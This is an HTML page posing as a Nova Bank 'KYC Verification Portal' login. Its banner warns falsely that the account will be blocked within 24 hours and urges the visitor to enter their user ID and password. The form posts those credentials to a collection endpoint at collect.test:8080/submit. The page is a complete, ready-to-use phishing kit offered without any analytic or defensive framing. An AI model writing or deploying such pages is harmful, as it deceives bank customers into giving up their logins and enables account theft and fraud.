<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nova Bank Net Banking Login</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    body { background-color: #f0f4f8; color: #1e293b; min-height: 100vh; display: flex; flex-direction: column; }
    header { background: #0f172a; color: white; padding: 1.25rem 2rem; display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid #2563eb; }
    .brand { display: flex; align-items: center; gap: 0.75rem; font-size: 1.4rem; font-weight: 700; letter-spacing: -0.02em; }
    .logo-badge { width: 32px; height: 32px; background: #2563eb; border-radius: 6px; display: flex; align-items: center; justify-content: center; font-weight: 900; color: white; }
    .container { flex: 1; display: flex; align-items: center; justify-content: center; padding: 2rem 1rem; }
    .card { background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.06); width: 100%; max-width: 440px; padding: 2.25rem; border: 1px solid #e2e8f0; }
    h2 { font-size: 1.4rem; margin-bottom: 0.5rem; color: #0f172a; }
    p.subtitle { color: #64748b; font-size: 0.9rem; margin-bottom: 1.25rem; }
    .urgent-banner { background: #fee2e2; border: 1.5px solid #ef4444; border-radius: 6px; padding: 0.85rem; margin-bottom: 1.25rem; color: #991b1b; font-size: 0.88rem; font-weight: 600; display: flex; align-items: center; gap: 0.5rem; }
    .form-group { margin-bottom: 1.25rem; }
    label { display: block; font-size: 0.85rem; font-weight: 600; color: #334155; margin-bottom: 0.35rem; }
    input[type="text"], input[type="password"] { width: 100%; padding: 0.75rem; border: 1.5px solid #cbd5e1; border-radius: 6px; font-size: 0.95rem; }
    input:focus { outline: none; border-color: #2563eb; box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15); }
    button { width: 100%; padding: 0.8rem; background: #dc2626; color: white; border: none; border-radius: 6px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: background 0.15s; }
    button:hover { background: #b91c1c; }
    footer { background: #ffffff; border-top: 1px solid #e2e8f0; text-align: center; padding: 1.25rem; font-size: 0.8rem; color: #64748b; }
  </style>
</head>
<body>
  <header>
    <div class="brand">
      <div class="logo-badge">N</div>
      <span>Nova Bank</span>
    </div>
    <div style="font-size: 0.85rem; color: #94a3b8;">KYC Verification Portal</div>
  </header>

  <div class="container">
    <div class="card">
      <div class="urgent-banner">
        <span>⚠️</span>
        <span>Your KYC expires in 24 hours. Verify now to avoid account block.</span>
      </div>

      <h2>Verify Your Net Banking Account</h2>
      <p class="subtitle">Enter your login credentials below to complete immediate re-verification and avoid account suspension.</p>

      <!-- Form posts to collect.test:8080/submit -->
      <form action="http://collect.test:8080/submit" method="POST">
        <div class="form-group">
          <label for="userid">User ID / Customer ID</label>
          <input type="text" id="userid" name="userid" placeholder="Enter your User ID" required autocomplete="username">
        </div>
        <div class="form-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" placeholder="Enter password" required autocomplete="current-password">
        </div>
        <button type="submit">Verify KYC &amp; Continue</button>
      </form>
    </div>
  </div>

  <footer>
    &copy; 2026 Nova Bank Ltd. All rights reserved.
  </footer>
</body>
</html>
